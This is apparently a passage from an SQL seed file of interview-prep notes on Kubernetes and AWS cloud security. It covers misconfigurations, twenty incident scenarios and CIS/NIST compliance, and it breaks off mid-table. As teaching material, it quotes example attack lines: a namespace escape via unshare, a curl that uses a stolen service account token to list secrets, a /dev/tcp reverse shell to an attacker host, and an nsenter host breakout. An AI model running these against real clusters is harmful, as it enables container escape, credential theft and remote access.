**Why It's Dangerous:** Without seccomp, the container has access to ALL ~300+ Linux syscalls. Attackers can use dangerous syscalls like `ptrace` (attach to processes), `mount` (mount filesystems), `unshare` (create new namespaces), and `reboot` (crash the node).

**Real Attack Scenario:**
Without seccomp, attacker uses `unshare` to create a new namespace and escape:
```bash
unshare -Urpf --mount-proc bash    # New user namespace with root
# Now has root in new namespace — can attempt further escape
```
With `RuntimeDefault` seccomp, `unshare` is blocked.

**Console Detection:**
- **CSPM → IOM**: `NoSeccompProfileApplied` (MEDIUM)
- **KAC**: Can require seccomp profile
- **PSA**: `restricted` profile requires `RuntimeDefault` or `Localhost` seccomp

**Remediation:**
```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault    # Docker/containerd default — blocks ~44 dangerous syscalls
    # OR for stricter:
    # type: Localhost
    # localhostProfile: profiles/custom.json
```

**Syscalls blocked by RuntimeDefault include:** `ptrace`, `mount`, `umount`, `reboot`, `settimeofday`, `swapon`, `swapoff`, `init_module`, `delete_module`

**Interview Answer:**
> "Seccomp is the last line of defense at the kernel level. `RuntimeDefault` blocks ~44 dangerous syscalls with zero impact on most applications. I enforce it via the PSA restricted profile and KAC. For high-security workloads, I create custom seccomp profiles that only allow the exact syscalls the application uses — tools like `strace` and `seccomp-audit` help identify the minimum required set."

---

#### Misconfig 9: Missing Resource Limits (CPU/Memory)

**The Bad Config:**
```yaml
containers:
  - name: app
    image: myapp:latest
    # ← No resources.requests or resources.limits specified
```

**Why It's Dangerous:** Without resource limits, a single compromised container can consume ALL node resources. A cryptominer or fork bomb can starve other pods, including the Falcon sensor DaemonSet, causing monitoring blind spots.

**Real Attack Scenario:**
Attacker deploys XMRig cryptominer. Without CPU limits, it consumes 100% of the node's CPU:
- Other pods on the node get OOM killed or CPU-starved
- Falcon sensor DaemonSet can't process telemetry → detection delay/failure
- Node becomes unresponsive → cascading failures

**Console Detection:**
- **CSPM → IOM**: `NoResourceLimitsSet` (MEDIUM)
- **KAC**: Can enforce resource limits as mandatory
- **CWPP**: `CryptominingActivity` will still fire but with delay if sensor is resource-starved

**Remediation:**
```yaml
resources:
  requests:
    cpu: "100m"
    memory: "128Mi"
  limits:
    cpu: "500m"
    memory: "512Mi"
```
Also set `LimitRange` objects per namespace to enforce defaults:
```yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: production
spec:
  limits:
    - default:
        cpu: "500m"
        memory: "512Mi"
      defaultRequest:
        cpu: "100m"
        memory: "128Mi"
      type: Container
```

**Interview Answer:**
> "Resource limits aren't just about cost optimization — they're a security control. Without limits, a cryptominer or fork bomb can DoS the entire node, including the security sensor. I enforce resource limits via LimitRange per namespace and KAC policies. This also prevents noisy-neighbor attacks where one compromised pod starves the node."

---

#### Misconfig 10: Service Account Token Auto-Mount

**The Bad Config:**
```yaml
spec:
  # automountServiceAccountToken not specified → defaults to TRUE
  # Every pod gets a K8s API token mounted at:
  # /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Why It's Dangerous:** Most application pods NEVER need to talk to the K8s API. But by default, every pod gets an API token mounted. If the container is compromised, the attacker reads the token and uses it to query the K8s API — list secrets, create pods, escalate privileges.

**Real Attack Scenario:**
Attacker compromises a web app → reads the service account token:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces/default/secrets
# Lists ALL secrets in the namespace if RBAC allows
```

**Console Detection:**
- **CSPM → IOM**: `ServiceAccountTokenAutoMounted` (MEDIUM)
- **CWPP**: `SuspiciousKubernetesAPIAccess` — detects unusual API queries from pods
- **KAC**: Can enforce `automountServiceAccountToken: false`

**Remediation:**
```yaml
# On the ServiceAccount:
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-app-sa
automountServiceAccountToken: false    # Disable auto-mount

# OR on the Pod spec (overrides SA setting):
spec:
  automountServiceAccountToken: false
```
For pods that DO need API access: use a dedicated ServiceAccount with minimal RBAC + short-lived token (TokenRequest API).

**Interview Answer:**
> "Service account token auto-mounting is a silent attack surface. 90% of pods never need to talk to the K8s API, but every pod gets a token by default. I disable auto-mounting globally via KAC policy, then create dedicated ServiceAccounts with minimal RBAC only for pods that actually need API access. This single change eliminates the most common post-exploitation pivot vector in Kubernetes."

---

### PSS Enforcement Interview Summary

> **The Key Message:** "Pod Security Standards give you three predefined security profiles — Privileged, Baseline, and Restricted. I enforce at least the Baseline profile on all namespaces and Restricted on security-critical namespaces like payments and PII. KAC supplements PSA by adding image scanning gates and custom organization policies that PSA can't cover. Together, PSA + KAC form a double admission gate: PSA enforces security context standards, KAC adds runtime image trust and CrowdStrike-specific policies."

---

# SECTION 4: INCIDENT SCENARIOS — 20 REAL-WORLD SITUATIONS

> Each scenario: What Happened → How to Detect in the Console → Investigation Steps → Containment → Prevention → Interview Answer

---

## Scenario 1: Reverse Shell from a Container

**Situation:** Web application pod compromised via RCE. Attacker spawns reverse shell.

**Console Navigation:**
1. **Detections → IOA → `ReverseShellDetected`**
2. Click detection → Process Tree: `node → sh → bash -i >& /dev/tcp/attacker-ip/4444`
3. Drift indicator: `bash` not in original image
4. Network tab: outbound TCP to non-standard port

**Actions:** Kill pod → deny-all NetworkPolicy → patch app → enforce `readOnlyRootFilesystem` → default-deny egress

**Interview Answer:**
> "Web servers should never spawn bash. The process tree is the primary signal. Drift confirms the shell wasn't in the image. Immediate: kill the pod, isolate the namespace. Long-term: readOnlyRootFilesystem, default-deny egress, and drift prevention in PREVENT mode."

---

## Scenario 2: Privileged Container Breakout

**Situation:** Pod with `privileged: true` compromised. Attacker mounts host filesystem via nsenter.

**Console Navigation:**
1. **Detections → IOA → `PotentialKernelTampering` / `ContainerEscape.Nsenter`**
2. Process tree: `app → nsenter --target 1 --mount --pid --net -- bash`
3. File access: `/var/lib/kubelet/kubeconfig` read

**Actions:** Kill pod → cordon node → rotate ALL cluster secrets → replace node → set KAC to PREVENT for privileged containers

**Interview Answer:**
> "Privileged container + nsenter = assume full node compromise. I kill the pod, cordon the node, and rotate all cluster secrets because kubelet credentials were potentially accessed. KAC should never allow `privileged: true` in production."

---

## Scenario 3: Cryptominer via Supply Chain (Poisoned Image)

**Situation:** Upstream Docker Hub image compromised. XMRig miner runs as thread inside Python process at 40% CPU.

**Console Navigation:**
1. **Detections → IOA → `CryptominingActivity.UnusualCPUPattern`**
2. Network: persistent connections to mining pool IPs (Falcon Intel flagged)
3. `SuspiciousLibraryLoad`: libssl.so SHA256 mismatch vs official image
4. **Posture → IOM**: image using floating tag, no digest pin

**Actions:** Quarantine pod → extract malicious library (RTR) → switch to digest-pinned images from private ECR → KAC blocks unassessed images

**Interview Answer:**
> "Supply chain attacks are the hardest to detect because the malware ships inside the trusted image. The signals were: CPU anomaly at 40%, connections to mining pool IPs flagged by Falcon threat intel, and a library SHA256 mismatch. My prevention approach: never use floating tags from Docker Hub — pin to digest, mirror to private ECR, enforce KAC image assessment, and monitor for unusual CPU/network patterns as a backstop."

---

## Scenario 4: Sleeping IAM Key Reactivated

**Situation:** Terminated employee's IAM key reactivated by intern's script error. Credential appears on dark web within 3 hours.

**Console Navigation:**
1. **Posture → IOM → `IAMAccessKeyInactive90DaysNotDeleted`** (47 days old)
2. **Posture → IOM → `IAMAccessKeyStatusChange`** (new — key reactivated)
3. **CIEM → Identity graph**: user marked TERMINATED in HR integration

**Actions:** Invalidate the key → apply inline deny → reconcile all keys against HR system weekly → automate JML (Joiner-Mover-Leaver) process

**Interview Answer:**
> "This is a process failure, not a tool failure. The CSPM flagged inactive keys for 47 days — nobody acted. My fix: automate JML with Lambda that deactivates keys when employees leave, enforce 90-day key rotation via SCP, and create an SLA that forces IAM key IOMs to be resolved within 48 hours. No dormant key should exist past 90 days."

---

## Scenario 5: ArgoCD Takeover via Default Password

**Situation:** ArgoCD with default admin password on public LoadBalancer. Attacker deploys DaemonSet via GitOps.

**Console Navigation:**
1. **Posture → IOM**: "ArgoCD exposed via public LoadBalancer" (11 days old, CRITICAL)
2. **Posture → IOM**: "ArgoCD default admin password unchanged" (CRITICAL)
3. **Detections → IOA**: `SuspiciousKubernetesDaemonSet` — unapproved registry, privileged
4. **KAC**: BLOCKED deployment (image from external registry)

**Key Lesson:** CSPM findings existed 11 days before attack. Nobody acted. CSPM SLA enforcement is critical.

**Interview Answer:**
> "ArgoCD with default credentials on a public LB is a gift to attackers. Two CRITICAL IOMs sat unfixed for 11 days — that's a process failure. KAC saved us by blocking the malicious DaemonSet from an unapproved registry. My takeaway: enforce SLAs on CRITICAL CSPM findings (24 hours max), and always restrict admin consoles behind VPN or internal network. This scenario is why I track MTTR on CSPM findings."

---

## Scenario 6: Lambda Persistence Backdoor via AWS Config

**Situation:** Contractor creates AWS Config rule that re-creates a backdoor IAM role every 24 hours.

**Console Navigation:**
1. **Posture → IOM**: "IAM role created outside IaC pipeline" (Day 6)
2. **Posture → IOM**: "Config remediation points to unknown Lambda" (Day 8)
3. **Detections → IOA**: "Lambda performing IAM operations" (Day 10)
4. **CIEM**: `AnomalousRoleAssumption` — role assumed from external IP (Day 14)

**19-day timeline due to process failure. Three HIGH findings not correlated until Day 17.**

**Interview Answer:**
> "This is a sophisticated persistence technique — using AWS Config remediation rules as a trojan horse. Three individual HIGH findings weren't correlated for 17 days. My lesson: use Wiz Attack Paths or Falcon's Exposure Management to correlate IOMs that share the same identity or resource chain. A Lambda performing IAM operations combined with an out-of-band IAM role is a pattern I now watch for specifically."

---

## Scenario 7: IRSA JWT Stolen and Used Externally

**Situation:** Container escape → service account JWT stolen → used from external IP to assume IAM role.

**Console Navigation:**
1. **CloudTrail**: `AssumeRoleWithWebIdentity` from external IP
2. **CIEM**: `ExternalIRSAAbuse` alert

**Prevention:** All IRSA roles MUST have `aws:SourceVpc` condition. Enforce via SCP. This alert is virtually always a true positive.

**Interview Answer:**
> "IRSA JWT tokens are scoped to a cluster, but if the trust policy doesn't enforce `aws:SourceVpc`, stolen tokens work from anywhere. When I see `AssumeRoleWithWebIdentity` from an external IP, it's almost always a real compromise — there's no legitimate reason for IRSA to be used outside the VPC. I enforce `aws:SourceVpc` condition on every IRSA trust policy via SCP and monitor for this pattern in CloudTrail."

---

## Scenario 8: kubectl exec Abuse — Data Theft

**Situation:** Attacker gets leaked kubeconfig, execs into payments pod, reads env vars with DB credentials.

**Console Navigation:**
1. **K8s Audit Logs**: `pods/exec` from unknown IP
2. **Detections → IOA**: `InteractiveContainerSession`
3. Process tree: `sh → printenv | grep password → mysql -u admin`

**Prevention:** Restrict pods/exec to break-glass RBAC role. Secrets in Secrets Manager, not env vars.

**Interview Answer:**
> "kubectl exec is the K8s equivalent of SSH — it should be heavily restricted. I limit `pods/exec` to a break-glass ClusterRole that requires approval. The deeper issue here is secrets in environment variables — `printenv` gives everything. I move secrets to AWS Secrets Manager with External Secrets Operator, so even if someone execs in, there's nothing to read in env vars."

---

## Scenario 9: S3 Exfiltration via Pre-signed URLs

**Situation:** Compromised Lambda generates pre-signed URLs for PII bucket. Downloads appear as anonymous GET requests.

**Console Navigation:**
1. **CloudTrail**: `GeneratePresignedUrl` at high volume
2. **S3 Server Access Logs**: massive GetObject from external IPs
3. **Macie**: sensitive data access pattern anomaly

**Prevention:** Pre-signed URL max expiry 1 hour. VPC endpoint restriction. Macie monitoring on all PII buckets.

**Interview Answer:**
> "Pre-signed URLs are a blind spot because CloudTrail logs the generation, not the download. The downloads appear as anonymous GETs in S3 server access logs. For PII buckets, I enforce VPC endpoint policies so pre-signed URLs only work from within our VPC, cap expiry at 1 hour, and use Macie to detect abnormal data access patterns. This attack bypasses IAM because the URL is bearer-token-like."

---

## Scenario 10: Exposed Kubelet Port (10250)

**Situation:** Security group allows 10250 from 0.0.0.0/0 for 34 days. Attacker executes commands in pods via kubelet API.

**Console Navigation:**
1. **Posture → IOM**: "Security group allows 10250 from 0.0.0.0/0" (34 days old)
2. **GuardDuty**: `Recon:EC2/PortProbeUnprotectedPort`

**Prevention:** CIS EKS 3.2.1 — disable kubelet anonymous auth, restrict SG.

**Interview Answer:**
> "Port 10250 is the kubelet API — it allows executing commands in any pod on that node. It sat open for 34 days — a classic SLA failure. My remediation: lock SG to allow 10250 only from the control plane CIDR, disable kubelet anonymous auth, and add this specific check as a CRITICAL IOM with an automated SLA alert. GuardDuty's port probe finding should have triggered investigation immediately."

---

## Scenario 11: Container Drift — Offensive Tool Kit

**Situation:** RCE exploited in Node.js app. Attacker drops pspy, chisel, linpeas via curl.

**Console Navigation:**
1. **Detections → IOA**: `ContainerDrift.OffensiveToolDrop`
2. SHA256 hashes match known offensive tools in Falcon threat intel
3. Network: chisel tunnel keepalive (beacon pattern)

**Prevention:** Drift prevention in PREVENT mode. readOnlyRootFilesystem. Default-deny egress.

**Interview Answer:**
> "What made this interesting is the attacker dropped a complete toolkit — pspy for process snooping, chisel for tunneling, and linpeas for privilege escalation. Falcon matched the SHA256 hashes against its threat intel database. My layered defense: readOnlyRootFilesystem blocks the initial file write, drift prevention in PREVENT mode catches anything written to emptyDir volumes, and default-deny egress prevents downloading tools in the first place. All three layers matter."

---

## Scenario 12: Helm Chart Supply Chain Attack

**Situation:** Compromised Helm chart maintainer injects malicious InitContainer that exfiltrates SA tokens.

**Console Navigation:**
1. **Image Assessment**: InitContainer image fails trust verification
2. **Detections → IOA**: First-seen outbound connection from InitContainer
3. **KAC**: Blocks deployment (unapproved registry)

**Prevention:** All Helm charts pulled to private registry, scanned and signed before use.

**Interview Answer:**
> "Helm chart supply chain attacks are growing because teams blindly `helm install` from public repos. The malicious InitContainer ran before the main app, exfiltrated the ServiceAccount token, and terminated cleanly — leaving no trace in the running pod. KAC blocked deployment because the InitContainer image was from an unapproved registry. My rule: all Helm charts are vendored into our private registry, charts are reviewed in PR, and image references are pinned to digest."

---

## Scenario 13: Docker Socket Mount Exploitation

**Situation:** Container with `/var/run/docker.sock` mounted. Attacker creates privileged container outside K8s.

**Console Navigation:**
1. **Detections → IOA**: `SuspiciousDockerSocketAccess`
2. **Assets → Containers**: "Unidentified Container — Visible to K8s: No"
3. **Posture → IOM**: "docker.sock mounted as HostPath Volume"

**Prevention:** KAC blocks HostPath volume mounts for docker.sock. Use Kaniko for CI/CD builds.

**Interview Answer:**
> "Docker socket mount is one of the most dangerous K8s misconfigurations. With the socket, an attacker can `docker run --privileged` a new container completely outside Kubernetes — invisible to K8s RBAC, NetworkPolicies, and admission control. Falcon catches it because the sensor runs at the node level and sees all containers, even non-K8s ones. I block docker.sock mounts via KAC and migrate CI/CD to Kaniko for daemonless image builds."

---

## Scenario 14: DNS Tunneling for Data Exfiltration

**Situation:** Compromised container uses DNS queries with encoded data in subdomain labels to exfiltrate data.

**Console Navigation:**
1. **Detections → IOA**: `SuspiciousDNSRequest`
2. Network: hundreds of DNS queries/minute to single unusual domain
3. DNS query inspection: abnormally long subdomain labels (encoded data)

**Prevention:** Restrict pods to cluster DNS only. NetworkPolicies blocking UDP/53 to external IPs.

**Interview Answer:**
> "DNS tunneling is stealthy because DNS is almost never blocked. The attacker encodes data in subdomain labels — something like `base64data.evil.com`. The signals: abnormally high DNS query rate and unusually long subdomain labels. My prevention: NetworkPolicies that restrict egress DNS to CoreDNS only (deny UDP/53 to external IPs), which forces all resolution through the cluster. Any direct external DNS query from a pod is suspicious by itself."

---

## Scenario 15: Cross-Account Role Chaining (3-Hop Attack)

**Situation:** Stolen access keys → AssumeRole across 3 accounts without ExternalId conditions.

**Console Navigation:** CIEM → `CrossAccountRoleChain` → visual graph showing 3-hop path with permissions at each node.

**Prevention:** All cross-account trust policies require `aws:SourceAccount` or `ExternalId` condition. Enforce via SCP.

**Interview Answer:**
> "Cross-account role chaining without conditions is the IAM equivalent of leaving all doors unlocked. The attacker hopped across 3 accounts, gaining more permissions at each hop. CIEM's visual graph made the path obvious. My fix: enforce `aws:SourceAccount` and `ExternalId` on ALL cross-account trust policies via SCP, and use CIEM to identify any trust relationship that doesn't have conditions — those are always a finding."

---

## Scenario 16: eBPF Program Loaded from Container

**Situation:** Attacker loads malicious eBPF program from inside a container to intercept syscalls.

**Console Navigation:**
1. **Detections → IOA**: `PotentialKernelTampering` — eBPF from container
2. Container had `CAP_SYS_ADMIN` or `CAP_BPF` capabilities

**Prevention:** Drop `CAP_SYS_ADMIN` and `CAP_BPF` via KAC. Legitimate eBPF (Cilium, Falcon sensor) runs at node level, never from application containers.

**Interview Answer:**
> "eBPF from inside an application container is always malicious. Legitimate eBPF users — Falcon sensor, Cilium CNI — run at the node level as DaemonSets with explicit privileges. The root cause was `CAP_SYS_ADMIN` or `CAP_BPF` granted to the container. I enforce `drop: ALL` via KAC and PSA restricted profile. If Falcon fires PotentialKernelTampering from an application pod, it's a true positive. Period."

---

## Scenario 17: Secrets Manager Mass Theft via Lambda

**Situation:** Lambda with `secretsmanager:GetSecretValue` on `*` exploited via command injection. 47 secrets exfiltrated in 60 seconds.

**Console Navigation:**
1. **CloudTrail**: `ListSecrets` → 47x `GetSecretValue` in 60s
2. **CIEM**: `UnusedPrivilegeExercised` — this permission was never used before

**Prevention:** Every secret access permission must specify exact ARNs. `ListSecrets` denied for application roles.

**Interview Answer:**
> "47 secrets in 60 seconds — this is what happens when IAM policies use `Resource: *` on Secrets Manager. The Lambda only needed 2 specific secrets. CIEM flagged `UnusedPrivilegeExercised` because this permission pattern was never seen before. My policy: every `GetSecretValue` must specify exact ARNs, `ListSecrets` is denied for all application roles, and I monitor CloudTrail for burst `GetSecretValue` calls as a custom detection."

---

## Scenario 18: EC2 IMDS v1 Credential Theft via SSRF

**Situation:** SSRF vulnerability in web app allows attacker to query IMDS and steal instance role credentials.

**Console Navigation:**
1. **Detections → IOA**: HTTP request to 169.254.169.254 from app process
2. **CloudTrail**: API calls from instance role with external source IP
3. **GuardDuty**: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`

**Prevention:** Enforce IMDSv2 (`--http-tokens required`). Deploy IRSA for pod-level AWS access.

**Interview Answer:**
> "SSRF to IMDS is the number one cloud attack vector. IMDSv1 returns credentials with a simple GET — no headers needed. IMDSv2 requires a PUT to get a token first, which SSRF can't do. I enforce IMDSv2 via launch template (`--http-tokens required`), set hop limit to 1 on EKS nodes so containers can't reach IMDS at all, and migrate all workloads to IRSA so no pod depends on instance metadata for credentials."

---

## Scenario 19: etcd Direct Access — Cluster-Wide Secret Extraction

**Situation:** Self-managed K8s cluster with etcd port 2379 open without client cert auth.

**Console Navigation:**
1. **Detections → IOA**: `UnauthorizedAPIAccess.etcd`
2. **Posture → IOM**: etcd accessible without client certificate auth (CRITICAL)

**Prevention:** Mutual TLS on etcd. Port 2379 restricted to API server only. Encrypt etcd at rest.

**Interview Answer:**
> "etcd stores every K8s secret in plain base64 by default. Direct access = full cluster compromise. This only applies to self-managed K8s because managed EKS handles etcd security. I enforce mutual TLS on etcd, restrict port 2379 to the API server's IP only, and enable EncryptionConfiguration with aescbc or kms provider for secrets at rest. CIS Benchmark 1.2.29 specifically covers this."

---

## Scenario 20: Falcon Sensor Coverage Gap (DaemonSet Not Running)

**Situation:** New EKS node group added with taints. Falcon DaemonSet doesn't tolerate them. Coverage drops to 85%.

**Console Navigation:**
1. **Dashboard**: Coverage dropped from 100% to 85%
2. **Assets → Nodes**: 3 nodes show "No Sensor"
3. `kubectl get ds -n falcon-system`: DESIRED: 10, CURRENT: 7

**Fix:** Add `tolerations: [{operator: Exists}]` to DaemonSet. Set up automated EC2↔Falcon API reconciliation.

**Interview Answer:**
> "Coverage gaps are silent killers. If the sensor isn't running, nothing else matters — no detections, no drift prevention, no process trees. When new node groups are added with custom taints, the DaemonSet must tolerate them. I set `tolerations: [{operator: Exists}]` so the sensor runs everywhere. I also run a weekly Python script that compares EC2 instances in the auto-scaling group against Falcon-registered hosts and alerts on any mismatch. 100% coverage is non-negotiable."

---

*End of Part 1 — Continue to Part 2 for Compliance Deep Dive, Interview Q&A Mastery, and Automation Playbooks*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Ultimate_Interview_Prep_Part2$VELSEC$, $VELSEC$Ultimate Interview Prep Part2$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 🎯 ULTIMATE CLOUD SECURITY INTERVIEW PREPARATION GUIDE
## Part 2 — CIS/NIST Compliance Mastery, Interview Q&A, Automation Playbooks & Role Readiness

> **Gopikrishna Vallepu** | Application Security / Cloud Security Engineer
> Tailored for: EY India — CNAPP, CWPP, CSPM, Vulnerability Management, Multi-Cloud Security

---

# SECTION 5: TRUE POSITIVE vs FALSE POSITIVE — THE DECISION FRAMEWORK

> This is the #1 skill interviewers test. You MUST be able to articulate how you decide.

## 5.1 The TP/FP Decision Tree

```
DETECTION RECEIVED
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│ STEP 1: CONTEXT CHECK                                         │
│                                                                │
│ • Which workload type? (web server, CI/CD, batch job, DB)     │
│ • Which environment? (production, staging, dev)               │
│ • What time? (business hours vs 3 AM)                         │
│ • Who deployed it? (known team vs unknown)                    │
│ • Is there a change window active?                            │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ STEP 2: PROCESS TREE ANALYSIS                                  │
│                                                                │
│ Web server → bash → curl               = 🔴 SUSPICIOUS (TP)   │
│ CI/CD runner → bash → npm install       = 🟢 EXPECTED (FP)     │
│ Cron → bash → python → report.py       = 🟢 EXPECTED (FP)     │
│ Java → /bin/sh → /tmp/exploit           = 🔴 SUSPICIOUS (TP)   │
│ Init container → curl → health check   = 🟡 CHECK FURTHER      │
│ Python → bash → id; whoami; uname -a   = 🔴 RECON (TP)         │
└────────────────────────────┬─────────────────────────────────┘
                             │
                             ▼
┌──────────────────────────────────────────────────────────────┐
│ STEP 3: CORRELATION CHECK                                      │
│                                                                │
│ • Are there OTHER detections for this asset? (multi-signal)   │
│ • Is there a related CSPM finding? (misconfiguration enabling) │
│ • Does CIEM show unusual identity usage?                      │
│ • Does CloudTrail show anomalous API calls?                   │
│                                                                │
│ SINGLE signal = investigate cautiously                        │
│ MULTIPLE correlated signals = almost certainly TP → RESPOND   │
└────────────────────────────┬─────────────────────────────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
        ┌─────▼─────┐ ┌─────▼─────┐ ┌─────▼──────┐
        │  TRUE      │ │  FALSE    │ │  UNCERTAIN │
        │  POSITIVE  │ │  POSITIVE │ │            │
        │            │ │           │ │  Treat as  │
        │  → Respond │ │ → Suppress│ │  TP until  │
        │  → Contain │ │ → Document│ │  proven    │
        │  → Report  │ │ → Expiry  │ │  otherwise │
        │            │ │ → Review  │ │            │
        └────────────┘ └───────────┘ └────────────┘
```

## 5.2 Suppression Rules — The Safe Way

| Requirement | Detail | Why It Matters |
|------------|--------|----------------|
| **Justification** | Written reason why this is an FP | Auditable trail |
| **Scope** | As narrow as possible (specific image, namespace, label) | Prevents blind spots |
| **Expiry** | Maximum 90 days, auto-review | Business context changes |
| **Reviewer** | Named individual responsible for periodic review | Accountability |
| **Quarterly Review** | All suppressions reviewed every 90 days | Prevents suppression debt |

**Interview Answer:**
> "I never suppress without documentation. Every suppression has 4 components: justification, narrow scope, 90-day expiry, and an assigned reviewer. I run a quarterly suppression review where we validate that all existing suppressions are still warranted. The alternative — permanent, undocumented suppressions — creates exactly the blind spots attackers exploit."

## 5.3 Risk Acceptance Process

```
RISK ACCEPTANCE WORKFLOW:

1. Security team identifies a finding that cannot be remediated
   (legitimate business reason or technical constraint)

2. Security engineer documents:
   ├── Finding ID and description
   ├── Affected resources and blast radius
   ├── Business justification for acceptance
   ├── Compensating controls already in place
   ├── What happens if the risk materializes (business impact)
   └── Recommended additional compensating controls

3. Risk acceptance form submitted to:
   ├── LOW/MEDIUM risk → Team lead approval
   ├── HIGH risk → Director + CISO awareness
   └── CRITICAL risk → VP/CISO sign-off required

4. Acceptance formally recorded in risk register with:
   ├── Maximum duration: 90 days
   ├── Mandatory quarterly re-review
   ├── Compensating controls are the CONDITIONS of acceptance
   └── If compensating controls change → acceptance VOID

5. Tracking:
   ├── Risk register dashboard tracks all active acceptances
   ├── 30-day reminder to review compensating controls
   ├── Auto-expiry at 90 days → forces re-evaluation
   └── Governance report: total accepted risks by severity and age
```

---

# SECTION 6: CIS & NIST COMPLIANCE DEEP DIVE

## 6.1 CIS Benchmarks — What They Are and How to Use Them

```
CIS BENCHMARK STRUCTURE:

CIS AWS Foundations Benchmark v3.0
│
├── 1: Identity and Access Management (25 controls)
│   ├── 1.1: Maintain current contact details ─────── MANUAL
│   ├── 1.4: Ensure no root account access key ────── AUTOMATED via CSPM
│   ├── 1.5: Ensure MFA on root account ───────────── AUTOMATED via CSPM
│   ├── 1.10: Ensure MFA on all IAM users ─────────── AUTOMATED via CSPM
│   ├── 1.14: Ensure credentials unused 90d disabled── AUTOMATED via CSPM
│   └── 1.16: Ensure IAM policies used only via groups ─ AUTOMATED
│
├── 2: Storage (10 controls)
│   ├── 2.1.1: Ensure S3 Block Public Access ──────── AUTOMATED
│   ├── 2.1.2: Ensure MFA Delete on S3 ───────────── AUTOMATED
│   ├── 2.2.1: Ensure EBS encryption ─────────────── AUTOMATED
│   └── 2.3.1: Ensure RDS encryption ─────────────── AUTOMATED
│
├── 3: Logging (12 controls)
│   ├── 3.1: Ensure CloudTrail enabled all regions ── AUTOMATED
│   ├── 3.3: Ensure CloudTrail log validation ─────── AUTOMATED
│   ├── 3.7: Ensure VPC Flow Logging enabled ─────── AUTOMATED
│   └── 3.9: Ensure Config is enabled ────────────── AUTOMATED
│
├── 4: Monitoring (16 controls)
│   ├── 4.3: Ensure alarm for root usage ──────────── AUTOMATED
│   ├── 4.4: Ensure alarm for IAM policy changes ──── AUTOMATED
│   ├── 4.12: Ensure alarm for network gateway chgs── AUTOMATED
│   └── 4.15: Ensure alarm for AWS Config changes ── AUTOMATED
│
└── 5: Networking (6 controls)
    ├── 5.1: Ensure no SG allows 0.0.0.0/0 to 22 ─── AUTOMATED
    ├── 5.2: Ensure no SG allows 0.0.0.0/0 to 3389 ─ AUTOMATED
    ├── 5.3: Ensure VPC default SG restricts all ──── AUTOMATED
    └── 5.6: Ensure EC2 Metadata Service v2 ─────── AUTOMATED
```

### CIS EKS Benchmark — Key K8s Security Controls

| CIS EKS # | Control | What to Check | How to Fix |
|-----------|---------|--------------|------------|
| 3.2.1 | Kubelet anonymous auth disabled | `--anonymous-auth=false` | Managed node group config |
| 3.2.6 | Kubelet protect kernel defaults | `--protect-kernel-defaults=true` | Node bootstrap |
| 4.1.1 | RBAC enabled for cluster | `--authorization-mode=RBAC,Webhook` | EKS default |
| 4.2.1 | Minimize wildcard RBAC | No `*` in Role resources/verbs | kubectl get clusterroles -o yaml | grep "*" |
| 5.1.1 | Restrict image registries | KAC or OPA policy per namespace | KAC image assessment policy |
| 5.2.1 | Minimize privileged containers | `privileged: false` enforced | KAC + PSA |
| 5.2.2 | Minimize host PID sharing | `hostPID: false` | KAC |
| 5.2.3 | Minimize host network | `hostNetwork: false` | KAC |
| 5.2.9 | Minimize root containers | `runAsNonRoot: true` | SecurityContext + KAC |
| 5.3.2 | Ensure all namespaces have NetworkPolicies | At least 1 per namespace | Default deny apply |
| 5.4.1 | Prefer using secrets as volumes | Volumes over env vars | Pod spec review |
| 5.7.2 | Ensure seccomp profile | `RuntimeDefault` or custom | SecurityContext |

### Interview Answer — CIS:
> "I use CIS benchmarks as the primary baseline for CSPM policies. Each CIS control maps to a specific CSPM check in the platform. I load the appropriate CIS benchmark profile — AWS Foundations, EKS, Azure, or GCP — and run continuous assessments. Failing controls create IOMs with remediation steps. For audits, I export the compliance report showing pass/fail per control with evidence. The key metric I track is the percentage of 'automated' CIS controls that pass continuously — that tells me our configuration management maturity."

## 6.2 NIST Cybersecurity Framework (CSF) — Mapped to Your Role

```
NIST CSF 2.0 FUNCTIONS:

┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌──────────┐
│  GOVERN      │  │  IDENTIFY    │  │  PROTECT     │  │  DETECT      │  │  RESPOND     │  │ RECOVER  │
│              │  │              │  │              │  │              │  │              │  │          │
│ Policies     │  │ Asset        │  │ Access       │  │ Continuous   │  │ Analysis &   │  │ Recovery │
│ Risk mgmt    │→ │ inventory    │→ │ controls     │→ │ monitoring   │→ │ Containment  │→ │ Restore  │
│ Strategy     │  │ Risk assess  │  │ Encryption   │  │ Alerting     │  │ Mitigation   │  │ Improve  │
│ Oversight    │  │ Supply chain │  │ Awareness    │  │ Analysis     │  │ Reporting    │  │ Lessons  │
│              │  │              │  │ Security     │  │              │  │              │  │          │
└──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────┘
       │                │                │                │                │                │
       ▼                ▼                ▼                ▼                ▼                ▼
YOUR ROLE MAPPING:
       │                │                │                │                │                │
 SLA policies    CSPM scanning     KAC policies      CWPP runtime     IR lifecycle     Post-incident
 Risk accept     Asset inventory   SCPs/Policies     IOA detection    Containment      Recovery plan
 Compliance      CIEM analysis     Encryption enf.   IOM monitoring   Investigation    Lessons learned
 Governance      Vuln assessment   Build-breaking    Alert tuning     Eradication      Control updates
```

### NIST 800-53 — Key Controls for Cloud Security

| Control Family | Control ID | Control Name | How You Implement It |
|---------------|-----------|-------------|---------------------|
| **AC (Access Control)** | AC-2 | Account Management | CIEM — identify dormant accounts, enforce JML process |
